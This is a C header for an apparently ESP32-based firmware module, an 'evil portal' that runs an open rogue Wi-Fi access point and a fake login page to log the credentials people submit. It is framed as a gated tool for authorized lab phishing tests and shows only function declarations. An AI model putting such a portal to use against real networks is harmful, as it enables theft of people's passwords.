#pragma once
// LxveOS evil-portal — an authorized-lab rogue access point + captive credential-capture portal (the
// `evil_portal` catalog op). Brings up an OPEN SoftAP with an operator-chosen SSID and serves a generic
// "network login" page on every request (captive-portal catch-all); a submitted username/password is
// logged + counted. This is an OFFENSIVE-TX op: it transmits (the AP beacons), so it is gated on the arm
// framework — lxveos_arm_can_emit() must be true (armed, TX compiled in) before it will start.
//
// It does NOT impersonate any specific brand and authors no jammer/deauth frames; it is a phishing-
// awareness / credential-capture test tool for the owner's licensed, RF-shielded lab.
#include <stdbool.h>
#include <stdint.h>

#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

// Start the rogue AP + captive portal on `ssid` (an OPEN network). Returns ESP_ERR_NOT_ALLOWED if the unit
// is not armed / TX is compiled out, ESP_ERR_INVALID_STATE if already running, or an esp_err_t on bring-up
// failure. Tolerates the Wi-Fi stack already being initialised by the recon path.
esp_err_t lxveos_evilportal_start(const char *ssid);

// Tear down the portal + AP. Safe to call when not running (returns ESP_OK).
esp_err_t lxveos_evilportal_stop(void);

// True while the portal is running.
bool lxveos_evilportal_running(void);

// Number of credential submissions captured since the last start.
uint32_t lxveos_evilportal_captures(void);

#ifdef __cplusplus
}
#endif
